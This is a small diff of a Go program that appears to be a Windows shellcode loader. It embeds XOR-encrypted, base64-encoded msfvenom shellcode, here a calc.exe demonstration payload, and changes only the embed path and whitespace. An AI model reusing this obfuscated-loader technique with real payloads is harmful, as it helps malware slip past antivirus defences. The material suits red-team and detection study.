@@ -14,7 +14,7 @@ import (
 	win32 "golang.org/x/sys/windows"
 )
 
-//go:embed sc.xor.42.b64
+//go:embed shellcode/sc.xor.42.b64
 //msfvenom -p windows/x64/exec CMD='cmd.exe /c calc.exe' -f raw
 // XOR Encrypted with '42'
 var enc_sc_b64 string 
@@ -30,6 +30,7 @@ func checkError(err error){
 		log.Fatalln("[!] ERR:" ,err)
 	}
 }
+
 // https://kylewbanks.com/blog/xor-encryption-using-go
 // xor runs a XOR encryption on the input string, encrypting it if it hasn't already been,
 // and decrypting it if it has, using the key provided.
